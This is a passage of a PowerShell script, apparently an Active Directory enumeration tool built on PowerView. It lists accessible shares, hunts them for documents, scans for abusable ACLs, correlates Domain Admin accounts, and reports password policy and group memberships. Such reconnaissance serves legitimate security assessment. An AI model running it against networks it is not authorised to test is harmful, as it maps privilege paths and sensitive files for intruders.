				$TempLoggedOnUsersServerOU = foreach ($LoggedOnUser in $LoggedOnUsersServerOU) {
					[PSCustomObject]@{
						"User" = $LoggedOnUser.User
						"Domain" = $AllDomain
					}
				}

				if ($TempLoggedOnUsersServerOU) {
					$TempLoggedOnUsersServerOU | Format-Table -AutoSize -Wrap
					$HTMLLoggedOnUsersServerOU = $TempLoggedOnUsersServerOU | ConvertTo-Html -Fragment -PreContent "<h2>Logged on users for all machines in any Server OU</h2>"
				}
			}
		}
	}
	
	#######################################
    ######### Domain Shares ###############
	#######################################
	
	if(!$Shares){}
    else{
        Write-Host ""
		Write-Host "Accessible Domain Shares:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$DomainShares = Find-DomainShare -ComputerDomain $Domain -Server $Server -CheckShareAccess -Threads 100 -Delay 1
			$TempDomainShares = foreach ($DomainShare in $DomainShares) {
				[PSCustomObject]@{
					"Name" = $DomainShare.Name
					"ComputerName" = $DomainShare.ComputerName
					"Remark" = $DomainShare.Remark
				}
			}

			if ($TempDomainShares) {
				$TempDomainShares | Format-Table -AutoSize -Wrap
				$HTMLDomainShares = $TempDomainShares | ConvertTo-Html -Fragment -PreContent "<h2>Accessible Domain Shares</h2>"
			}
		}
		
		else {
			$TempDomainShares = foreach ($AllDomain in $AllDomains) {
				$DomainShares = Find-DomainShare -ComputerDomain $AllDomain -CheckShareAccess -Threads 100 -Delay 1
				foreach ($DomainShare in $DomainShares) {
					[PSCustomObject]@{
						"Name" = $DomainShare.Name
						"ComputerName" = $DomainShare.ComputerName
						"Remark" = $DomainShare.Remark
					}
				}
			}

			if ($TempDomainShares) {
				$TempDomainShares | Format-Table -AutoSize -Wrap
				$HTMLDomainShares = $TempDomainShares | ConvertTo-Html -Fragment -PreContent "<h2>Accessible Domain Shares</h2>"
			}
		}


        Write-Host ""
		Write-Host "Domain Share Files:" -ForegroundColor Cyan
		if($Domain -AND $Server) {
			$DomainShareFiles = Find-InterestingDomainShareFile -Server $Server -Threads 100 -Delay 1 | Select Owner,CreationTime,LastAccessTime,LastWriteTime,Path
			$TempDomainShareFiles = foreach ($DomainShareFile in $DomainShareFiles) {
				[PSCustomObject]@{
					"Owner" = $DomainShareFile.Owner
					"Path" = $DomainShareFile.Path
					"Domain" = $Domain
				}
			}
			
			if($TempDomainShareFiles){
				$TempDomainShareFiles | Format-Table -AutoSize -Wrap
				$HTMLDomainShareFiles = $TempDomainShareFiles | ConvertTo-Html -Fragment -PreContent "<h2>Domain Share Files</h2>"
			}
		}
		else{
			$TempDomainShareFiles = foreach($AllDomain in $AllDomains){
				$DomainShareFiles = Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Threads 100 -Delay 1 | Select Owner,CreationTime,LastAccessTime,LastWriteTime,Path
				foreach($DomainShareFile in $DomainShareFiles){
					[PSCustomObject]@{
						"Owner" = $DomainShareFile.Owner
						"Path" = $DomainShareFile.Path
						"Domain" = $AllDomain
					}
				}
			}
			
			if($TempDomainShareFiles){
				$TempDomainShareFiles | Format-Table -AutoSize -Wrap
				$HTMLDomainShareFiles = $TempDomainShareFiles | ConvertTo-Html -Fragment -PreContent "<h2>Domain Share Files</h2>"
			}
		}

        
        Write-Host ""
		Write-Host "Domain Share Files (more file extensions):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$InterestingFiles = Find-InterestingDomainShareFile -Server $Server -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 
			$TempInterestingFiles = foreach ($File in $InterestingFiles) {
				[PSCustomObject]@{
					"Owner" = $File.Owner
					"Path" = $File.Path
					"Domain" = $Domain
				}
			}

			if ($TempInterestingFiles) {
				$TempInterestingFiles | Format-Table -AutoSize -Wrap
				$HTMLInterestingFiles = $TempInterestingFiles | ConvertTo-Html -Fragment -PreContent "<h2>Domain Share Files (more file extensions)</h2>"
			}
		}
		else {
			$TempInterestingFiles = foreach ($AllDomain in $AllDomains) {
				$InterestingFiles = Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1
				foreach ($File in $InterestingFiles) {
					[PSCustomObject]@{
						"Owner" = $File.Owner
						"Path" = $File.Path
						"Domain" = $AllDomain
					}
				}
			}

			if ($TempInterestingFiles) {
				$TempInterestingFiles | Format-Table -AutoSize -Wrap
				$HTMLInterestingFiles = $TempInterestingFiles | ConvertTo-Html -Fragment -PreContent "<h2>Domain Share Files (more file extensions)</h2>"
			}
		}

    }
	
	#####################################
    ######### Domain ACLs ###############
	#####################################
    
    if(!$DomainACLs){}
    else{
        Write-Host ""
		Write-Host "Find interesting ACLs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ACLScannerResults = Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" }

			$TempACLScannerResults = foreach ($Result in $ACLScannerResults) {
				[PSCustomObject]@{
					"IdentityReferenceName" = $Result.IdentityReferenceName
					"ObjectDN" = $Result.ObjectDN
					"ActiveDirectoryRights" = $Result.ActiveDirectoryRights
					"Domain" = $Domain
				}
			}

			if ($TempACLScannerResults) {
				$TempACLScannerResults | Format-Table -AutoSize -Wrap
				$HTMLACLScannerResults = $TempACLScannerResults | ConvertTo-Html -Fragment -PreContent "<h2>Interesting ACLs:</h2>"
			}
		}
		else {
			$TempACLScannerResults = foreach ($AllDomain in $AllDomains) {
				$ACLScannerResults = Invoke-ACLScanner -Domain $AllDomain -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" }

				foreach ($Result in $ACLScannerResults) {
					[PSCustomObject]@{
						"IdentityReferenceName" = $Result.IdentityReferenceName
						"ObjectDN" = $Result.ObjectDN
						"ActiveDirectoryRights" = $Result.ActiveDirectoryRights
						"Domain" = $AllDomain
					}
				}
			}

			if ($TempACLScannerResults) {
				$TempACLScannerResults | Format-Table -AutoSize -Wrap
				$HTMLACLScannerResults = $TempACLScannerResults | ConvertTo-Html -Fragment -PreContent "<h2>Interesting ACLs:</h2>"
			}
		}

    }
	
	#############################################
    ######### DA Name Correlation ###############
	#############################################
	
	Write-Host ""
	Write-Host "Linked DA accounts using name correlation:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$LinkedDAAccounts = Get-DomainGroupMember 'Domain Admins' -Domain $Domain -Server $Server | ForEach-Object {
			$user = Get-DomainUser $_.membername -Domain $Domain -Server $Server -LDAPFilter '(displayname=*)'
			$nameParts = $user.displayname.split(' ')[0..1] -join ' '
			$linkedAccounts = Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter "(displayname=*$nameParts*)"
			foreach ($account in $linkedAccounts) {
				[PSCustomObject]@{
					"Account" = $account.samaccountname
					"Display Name" = $account.displayname
					"Enabled" = if ($account.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($account.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($account.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($account.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($account.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $account.lastlogontimestamp
					"SID" = $account.objectSID
					"Domain" = $Domain
				}
			}
		}

		if ($LinkedDAAccounts) {
			$LinkedDAAccounts | Format-Table -AutoSize -Wrap
			$HTMLLinkedDAAccounts = $LinkedDAAccounts | ConvertTo-Html -Fragment -PreContent "<h2>Linked DA accounts using name correlation</h2>"
		}
	}
	else {
		$LinkedDAAccounts = foreach ($AllDomain in $AllDomains) {
			$members = Get-DomainGroupMember 'Domain Admins' -Domain $AllDomain
			foreach ($member in $members) {
				$user = Get-DomainUser $member.membername -LDAPFilter '(displayname=*)'
				$nameParts = $user.displayname.split(' ')[0..1] -join ' '
				$linkedAccounts = Get-DomainUser -Domain $AllDomain -LDAPFilter "(displayname=*$nameParts*)"
				foreach ($account in $linkedAccounts) {
					[PSCustomObject]@{
						"Account" = $account.samaccountname
						"Display Name" = $account.displayname
						"Enabled" = if ($account.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($account.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
						"Adm" = if ($account.memberof -match 'Administrators') { "YES" } else { "NO" }
						"DA" = if ($account.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						"EA" = if ($account.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $account.lastlogontimestamp
						"SID" = $account.objectSID
						"Domain" = $AllDomain
					}
				}
			}
		}

		if ($LinkedDAAccounts) {
			$LinkedDAAccounts | Format-Table -AutoSize -Wrap
			$HTMLLinkedDAAccounts = $LinkedDAAccounts | ConvertTo-Html -Fragment -PreContent "<h2>Linked DA accounts using name correlation</h2>"
		}
	}
	
	########################################
    ########### Admin Groups ###############
	########################################
	
	Write-Host ""
	Write-Host "Admin Groups (by keyword):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$AdminGroups = Get-DomainGroup -Domain $Domain -Server $Server | Where-Object { $_.Name -like "*Admin*" }
		$TempAdminGroups = foreach ($AdminGroup in $AdminGroups) {
			[PSCustomObject]@{
				"Keyword" = "Admin"
				"Group Name" = $AdminGroup.SamAccountName
				"Group SID" = $AdminGroup.ObjectSID
				"Domain" = $Domain
				"Members" = ((Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $AdminGroup.SamAccountName).MemberName | Sort-Object -Unique) -join ' - '
				#Description = $AdminGroup.description
			} | Where-Object { $_.Members }
		}

		if ($TempAdminGroups) {
			$TempAdminGroups2 = $TempAdminGroups | Where-Object { $_.Members }
			$TempAdminGroups2 | Format-Table -AutoSize -Wrap
			$HTMLAdminGroups = $TempAdminGroups | ConvertTo-Html -Fragment -PreContent "<h2>Admin Groups (by keyword)</h2>"
		}
	}
	else {
		$TempAdminGroups = foreach ($AllDomain in $AllDomains) {
			$AdminGroups = Get-DomainGroup -Domain $AllDomain | Where-Object { $_.Name -like "*Admin*" }
			foreach ($AdminGroup in $AdminGroups) {
				[PSCustomObject]@{
					"Keyword" = "Admin"
					"Group Name" = $AdminGroup.SamAccountName
					"Group SID" = $AdminGroup.ObjectSID
					"Domain" = $AllDomain
					"Members" = ((Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $AdminGroup.SamAccountName).MemberName | Sort-Object -Unique) -join ' - '
					#Description = $AdminGroup.description
				} | Where-Object { $_.Members }
			}
		}

		if ($TempAdminGroups) {
			$TempAdminGroups2 = $TempAdminGroups | Where-Object { $_.Members }
			$TempAdminGroups2 | Format-Table -AutoSize -Wrap
			$HTMLAdminGroups = $TempAdminGroups2 | ConvertTo-Html -Fragment -PreContent "<h2>Admin Groups (by keyword)</h2>"
		}
	}
	
	#########################################
    ########### Groups by keyword ###########
	#########################################
	
	Write-Host ""
	Write-Host "Other Groups (by keyword):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$Keywords = @("SQL", "Remote", "VEEAM", "PSM", "Password", "Management", "LAPS", "Backup", "Security", "Cyber", "Director", "Desk", "CCTV", "Finance")
		$TempGroupsByKeyword = foreach ($Keyword in $Keywords) {
			Get-DomainGroup -Domain $Domain -Server $Server -Identity "*$Keyword*" |
			ForEach-Object {
				$Group = $_
				[PSCustomObject]@{
					"Keyword" = $Keyword
					"Group Name" = $Group.SamAccountName
					"Domain" = $Domain
					"Members" = ((Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $Group.distinguishedname -Recurse).membername | Sort-Object -Unique) -join ' - '
					#Description = $Group.description
				}
			}
		}

		if ($TempGroupsByKeyword) {
			$TempGroupsByKeyword2 = $TempGroupsByKeyword | Where-Object { $_.Members }
			$TempGroupsByKeyword2 | Format-Table -AutoSize -Wrap
			$HTMLGroupsByKeyword = $TempGroupsByKeyword2 | ConvertTo-Html -Fragment -PreContent "<h2>Other Groups (by keyword)</h2>"
		}
	}
	else {
		$TempGroupsByKeyword = foreach ($AllDomain in $AllDomains) {
			$Keywords = @("SQL", "Remote", "VEEAM", "PSM", "Password", "Management", "LAPS", "Backup", "Security", "Cyber", "Director", "Desk", "CCTV", "Finance")
			foreach ($Keyword in $Keywords) {
				Get-DomainGroup -Domain $AllDomain -Identity "*$Keyword*" |
				ForEach-Object {
					$Group = $_
					[PSCustomObject]@{
						"Keyword" = $Keyword
						"Group Name" = $Group.SamAccountName
						"Domain" = $AllDomain
						"Members" = ((Get-DomainGroupMember -Identity $Group.distinguishedname -Domain $AllDomain -Recurse).membername | Sort-Object -Unique) -join ' - '
						#Description = $Group.description
					}
				}
			}
		}

		if ($TempGroupsByKeyword) {
			$TempGroupsByKeyword2 = $TempGroupsByKeyword | Where-Object { $_.Members }
			$TempGroupsByKeyword2 | Format-Table -AutoSize -Wrap
			$HTMLGroupsByKeyword = $TempGroupsByKeyword2 | ConvertTo-Html -Fragment -PreContent "<h2>Other Groups (by keyword)</h2>"
		}
	}
	
	$AnalysisBanner = "<h3>Active Directory Domain Analysis</h3>"
	Write-Host ""
	Write-Host "Active Directory Domain Analysis" -ForegroundColor Red
	Write-Host ""
	
	################################################
    ######### Domain Password Policy ###############
	################################################
	
	
	Write-Host ""
	Write-Host "Domain Password Policy:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$DomainPolicy = Get-DomainPolicy -Domain $Domain -Server $Server
		$TempDomainPolicy = [PSCustomObject]@{
			"Domain" = $Domain
			"Min Pwd Age" = $DomainPolicy.SystemAccess.MinimumPasswordAge
			"Max Pwd Age" = $DomainPolicy.SystemAccess.MaximumPasswordAge
			"Min Pwd Length" = $DomainPolicy.SystemAccess.MinimumPasswordLength
			"Pwd Complexity" = $DomainPolicy.SystemAccess.PasswordComplexity
			"Password History" = $DomainPolicy.SystemAccess.PasswordHistorySize
			"Lockout Bad Count" = $DomainPolicy.SystemAccess.LockoutBadCount
			"Reset Lockout Count" = $DomainPolicy.SystemAccess.ResetLockoutCount
			"Lockout Duration" = $DomainPolicy.SystemAccess.LockoutDuration
			"Require Logon To Change Pwd" = $DomainPolicy.SystemAccess.RequireLogonToChangePassword
		}

		if ($TempDomainPolicy) {
			$TempDomainPolicy | Format-Table -AutoSize -Wrap
			$HTMLDomainPolicy = $TempDomainPolicy | ConvertTo-Html -Fragment -PreContent "<h2>Domain Password Policy</h2>"
		}
	}
	else {
		$TempDomainPolicy = foreach ($AllDomain in $AllDomains) {
			$DomainPolicy = Get-DomainPolicy -Domain $AllDomain
			[PSCustomObject]@{
				"Domain" = $AllDomain
				"Min Pwd Age" = $DomainPolicy.SystemAccess.MinimumPasswordAge
				"Max Pwd Age" = $DomainPolicy.SystemAccess.MaximumPasswordAge
				"Min Pwd Length" = $DomainPolicy.SystemAccess.MinimumPasswordLength
				"Pwd Complexity" = $DomainPolicy.SystemAccess.PasswordComplexity
				"Password History" = $DomainPolicy.SystemAccess.PasswordHistorySize
				"Lockout Bad Count" = $DomainPolicy.SystemAccess.LockoutBadCount
				"Reset Lockout Count" = $DomainPolicy.SystemAccess.ResetLockoutCount
				"Lockout Duration" = $DomainPolicy.SystemAccess.LockoutDuration
				"Require Logon To Change Pwd" = $DomainPolicy.SystemAccess.RequireLogonToChangePassword
			}
		}

		if ($TempDomainPolicy) {
			$TempDomainPolicy | Format-Table -AutoSize -Wrap
			$HTMLDomainPolicy = $TempDomainPolicy | ConvertTo-Html -Fragment -PreContent "<h2>Domain Password Policy</h2>"
		}
	}

	
	#########################################
    ######### Kerberos Policy ###############
	#########################################
	
	Write-Host ""
	Write-Host "Kerberos Password Policy:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$KerberosPolicy = Get-DomainPolicy -Domain $Domain -Server $Server
		$TempKerberosPolicy = [PSCustomObject]@{
			"Domain" = $Domain
			"Max Ticket Age" = $KerberosPolicy.KerberosPolicy.MaxTicketAge
			"Max Renew Age" = $KerberosPolicy.KerberosPolicy.MaxRenewAge
			"Max Service Age" = $KerberosPolicy.KerberosPolicy.MaxServiceAge
			"Max Clock Skew" = $KerberosPolicy.KerberosPolicy.MaxClockSkew
			"Ticket Validate Client" = $KerberosPolicy.KerberosPolicy.TicketValidateClient
		}

		if ($TempKerberosPolicy) {
			$TempKerberosPolicy | Format-Table -AutoSize -Wrap
			$HTMLKerberosPolicy = $TempKerberosPolicy | ConvertTo-Html -Fragment -PreContent "<h2>Kerberos Password Policy</h2>"
		}
	}
	else {
		$TempKerberosPolicy = foreach ($AllDomain in $AllDomains) {
			$KerberosPolicy = Get-DomainPolicy -Domain $AllDomain
			[PSCustomObject]@{
				"Domain" = $AllDomain
				"Max Ticket Age" = $KerberosPolicy.KerberosPolicy.MaxTicketAge
				"Max Renew Age" = $KerberosPolicy.KerberosPolicy.MaxRenewAge
				"Max Service Age" = $KerberosPolicy.KerberosPolicy.MaxServiceAge
				"Max Clock Skew" = $KerberosPolicy.KerberosPolicy.MaxClockSkew
				"Ticket Validate Client" = $KerberosPolicy.KerberosPolicy.TicketValidateClient
			}
		}

		if ($TempKerberosPolicy) {
			$TempKerberosPolicy | Format-Table -AutoSize -Wrap
			$HTMLKerberosPolicy = $TempKerberosPolicy | ConvertTo-Html -Fragment -PreContent "<h2>Kerberos Password Policy</h2>"
		}
	}
	
	##################################################
    ########### User Accounts Analysis ###############
	##################################################
	
	Write-Host ""
	Write-Host "User Accounts Analysis:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		
		$UserAccountAnalysis = Get-DomainUser -Domain $Domain -Server $Server
		
		$TempUserAccountAnalysis = [PSCustomObject]@{
			'Nb User Accounts' = $UserAccountAnalysis.Name.count
			'Nb Enabled' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
			'Nb Disabled' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -band 2 }).Name.Count
			'Nb Active' = ($UserAccountAnalysis | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
			'Nb Inactive' = ($UserAccountAnalysis | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
			'Nb Locked' = ($UserAccountAnalysis | Where-Object { $_.lockouttime -ne $null }).Name.Count
			'Nb Pwd Never Expire' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -match "DONT_EXPIRE_PASSWORD" }).Name.Count
			'Nb Password not Req.' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -match "PASSWD_NOTREQD" }).Name.Count
			'Nb Reversible password' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -band 128 }).Name.count
			Domain = $Domain
		}
		
		if ($TempUserAccountAnalysis) {
			$TempUserAccountAnalysis | Format-Table -AutoSize
			$HTMLUserAccountAnalysis = $TempUserAccountAnalysis | ConvertTo-Html -Fragment -PreContent "<h2>User Accounts Analysis</h2>"
		}
		
	}
	
	else{
		
		$TempUserAccountAnalysis = foreach ($AllDomain in $AllDomains) {
			$UserAccountAnalysis = Get-DomainUser -Domain $AllDomain
			
			[PSCustomObject]@{
				'Nb User Accounts' = $UserAccountAnalysis.Name.count
				'Nb Enabled' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Disabled' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -band 2 }).Name.Count
				'Nb Active' = ($UserAccountAnalysis | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
				'Nb Inactive' = ($UserAccountAnalysis | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
				'Nb Locked' = ($UserAccountAnalysis | Where-Object { $_.lockouttime -ne $null }).Name.Count
				'Nb Pwd Never Expire' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -match "DONT_EXPIRE_PASSWORD" }).Name.Count
				'Nb Password not Req.' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -match "PASSWD_NOTREQD" }).Name.Count
				'Nb Reversible password' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -band 128 }).Name.count
				Domain = $AllDomain
			}
			
		}
		
		if ($TempUserAccountAnalysis) {
			$TempUserAccountAnalysis | Format-Table -AutoSize
			$HTMLUserAccountAnalysis = $TempUserAccountAnalysis | ConvertTo-Html -Fragment -PreContent "<h2>User Accounts Analysis</h2>"
		}
	}
	
	######################################################
    ########### Computer Accounts Analysis ###############
	######################################################
	
	Write-Host ""
	Write-Host "Computer Account Analysis:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		
		$ComputerAccountAnalysis = Get-DomainComputer -Domain $Domain -Server $Server
		
		$TempComputerAccountAnalysis = [PSCustomObject]@{
			'Nb Computer Accounts' = $ComputerAccountAnalysis.Name.count
			'Nb Enabled' = ($ComputerAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
			'Nb Disabled' = $ComputerAccountAnalysis.Name.count - ($ComputerAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
			'Nb Active' = ($ComputerAccountAnalysis | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
			'Nb Inactive' = ($ComputerAccountAnalysis | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
			'Unconstrained Delegations' = ($TempUnconstrained | Where-Object {$_.Domain -eq $Domain}).Name.Count
			Domain = $Domain
		}
		
		if ($TempComputerAccountAnalysis) {
			$TempComputerAccountAnalysis | Format-Table -AutoSize
			$HTMLComputerAccountAnalysis = $TempComputerAccountAnalysis | ConvertTo-Html -Fragment -PreContent "<h2>Computer Account Analysis</h2>"
		}
		
	}
	
	else{
		
		$TempComputerAccountAnalysis = foreach ($AllDomain in $AllDomains) {
			$ComputerAccountAnalysis = Get-DomainComputer -Domain $AllDomain
			
			[PSCustomObject]@{
				'Nb Computer Accounts' = $ComputerAccountAnalysis.Name.count
				'Nb Enabled' = ($ComputerAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Disabled' = $ComputerAccountAnalysis.Name.count - ($ComputerAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Active' = ($ComputerAccountAnalysis | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
				'Nb Inactive' = ($ComputerAccountAnalysis | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
				'Unconstrained Delegations' = ($TempUnconstrained | Where-Object {$_.Domain -eq $AllDomain}).Name.Count
				Domain = $AllDomain
			}
			
		}
		
		if ($TempComputerAccountAnalysis) {
			$TempComputerAccountAnalysis | Format-Table -AutoSize
			$HTMLComputerAccountAnalysis = $TempComputerAccountAnalysis | ConvertTo-Html -Fragment -PreContent "<h2>Computer Account Analysis</h2>"
		}
	}
	
	######################################################
    ########### Operating Systems Analysis ###############
	######################################################
	
	Write-Host ""
	Write-Host "Operating Systems Analysis:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		
		$AllSystems = Get-DomainComputer -Domain $Domain -Server $Server
		$OperatingSystemsAnalysis = $AllSystems | Select-Object -ExpandProperty operatingsystem | Sort-Object -Unique
		
		$TempOperatingSystemsAnalysis = foreach($OperatingSystem in $OperatingSystemsAnalysis){
		
			[PSCustomObject]@{
				'Operating System' = $OperatingSystem
				'Nb OS' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).Name.count
				'Nb Enabled' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Disabled' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).Name.count - ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Active' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
				'Nb Inactive' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
				Domain = $Domain
			}
			
		}
		
		if ($TempOperatingSystemsAnalysis) {
			$TempOperatingSystemsAnalysis | Format-Table -AutoSize
			$HTMLOperatingSystemsAnalysis = $TempOperatingSystemsAnalysis | ConvertTo-Html -Fragment -PreContent "<h2>Operating Systems Analysis</h2>"
		}
		
	}
	
	else{
		
		$TempOperatingSystemsAnalysis = foreach ($AllDomain in $AllDomains) {
			$AllSystems = Get-DomainComputer -Domain $AllDomain
			$OperatingSystemsAnalysis = $AllSystems | Select-Object -ExpandProperty operatingsystem | Sort-Object -Unique
			
			foreach($OperatingSystem in $OperatingSystemsAnalysis){
				[PSCustomObject]@{
					'Operating System' = $OperatingSystem
					'Nb OS' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).Name.count
					'Nb Enabled' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
					'Nb Disabled' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).Name.count - ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
					'Nb Active' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
					'Nb Inactive' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
					Domain = $AllDomain
				}
			}
			
		}
		
		if ($TempOperatingSystemsAnalysis) {
			$TempOperatingSystemsAnalysis | Format-Table -AutoSize
			$HTMLOperatingSystemsAnalysis = $TempOperatingSystemsAnalysis | ConvertTo-Html -Fragment -PreContent "<h2>Operating Systems Analysis</h2>"
		}
	}
	
	###########################################
    ########### All Domain GPOs ###############
	###########################################
	
	if($NoGPOs){}
    else{
        Write-Host ""
		Write-Host "All Domain GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$DomainGPOs = Get-DomainGPO -Domain $Domain -Server $Server -Properties DisplayName, gpcfilesyspath | Sort-Object -Property DisplayName
			$TempDomainGPOs = foreach ($DomainGPO in $DomainGPOs) {
				[PSCustomObject]@{
					"DisplayName" = $DomainGPO.DisplayName
					"gpcfilesyspath" = $DomainGPO.gpcfilesyspath
				}
			}

			if ($TempDomainGPOs) {
				$TempDomainGPOs | Format-Table -AutoSize -Wrap
				$HTMLDomainGPOs = $TempDomainGPOs | ConvertTo-Html -Fragment -PreContent "<h2>All Domain GPOs</h2>"
			}
		}
		else {
			$TempDomainGPOs = foreach ($AllDomain in $AllDomains) {
				$DomainGPOs = Get-DomainGPO -Domain $AllDomain -Properties DisplayName, gpcfilesyspath | Sort-Object -Property DisplayName
				foreach ($DomainGPO in $DomainGPOs) {
					[PSCustomObject]@{
						"DisplayName" = $DomainGPO.DisplayName
						"gpcfilesyspath" = $DomainGPO.gpcfilesyspath
					}
				}
			}

			if ($TempDomainGPOs) {
				$TempDomainGPOs | Format-Table -AutoSize -Wrap
				$HTMLDomainGPOs = $TempDomainGPOs | ConvertTo-Html -Fragment -PreContent "<h2>All Domain GPOs</h2>"
			}
		}
		
	}

	
	##################################
    ########### All Groups ###########
	##################################
	
	if(!$AllGroups){}
	else{
		Write-Host ""
		Write-Host "All Groups:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$OtherGroups = Get-DomainGroup -Domain $Domain -Server $Server
			$TempOtherGroups = foreach ($OtherGroup in $OtherGroups) {
				[PSCustomObject]@{
					"Group Name" = $OtherGroup.SamAccountName
					"Group SID" = $OtherGroup.objectsid
					"Domain" = $Domain
					"Members" = ((Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $OtherGroup.SamAccountName).MemberName | Sort-Object -Unique) -join ' - '
					#Description = $OtherGroup.description
				}
			}

			if ($TempOtherGroups) {
				$TempOtherGroups2 = $TempOtherGroups | Where-Object { $_.Members }
				$TempOtherGroups2 | Format-Table -AutoSize -Wrap
				$HTMLOtherGroups = $TempOtherGroups2  | Where-Object { $_.Members } | ConvertTo-Html -Fragment -PreContent "<h2>All Groups</h2>"
			}
		}
		else {
			$TempOtherGroups = foreach ($AllDomain in $AllDomains) {
				$OtherGroups = Get-DomainGroup -Domain $AllDomain
				foreach ($OtherGroup in $OtherGroups) {
					[PSCustomObject]@{
						"Group Name" = $OtherGroup.SamAccountName
						"Group SID" = $OtherGroup.objectsid
						"Domain" = $AllDomain
						"Members" = ((Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $OtherGroup.SamAccountName).MemberName | Sort-Object -Unique) -join ' - '
						#Description = $OtherGroup.description
					}
				}
			}

			if ($TempOtherGroups) {
				$TempOtherGroups2 = $TempOtherGroups | Where-Object { $_.Members }
				$TempOtherGroups2 | Format-Table -AutoSize -Wrap
